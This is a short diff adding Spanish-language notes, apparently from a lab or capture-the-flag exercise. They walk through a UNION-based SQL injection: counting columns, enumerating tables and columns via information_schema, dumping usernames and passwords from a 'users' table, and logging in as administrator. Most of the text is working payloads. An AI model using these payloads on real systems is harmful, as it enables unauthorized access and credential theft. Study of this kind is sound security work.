@@ -1,0 +1,23 @@
+primero determinamos el numero de columnas
+
+' UNION SELECT NULL,NULL -- -
+
+luego preguntamos que tablas hay
+
+' UNION SELECT NULL,table_name FROM information_schema.tables -- -
+
+y encontramos una tabla que se llama users
+
+ahora vemos el nombre de las columnas que hay ahi 
+
+' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users' -- -
+
+email
+password
+username
+
+leemos las cositas
+
+' UNION SELECT username,password FROM users -- -
+
+y listo nos logeamos con las credenciales de administrador 
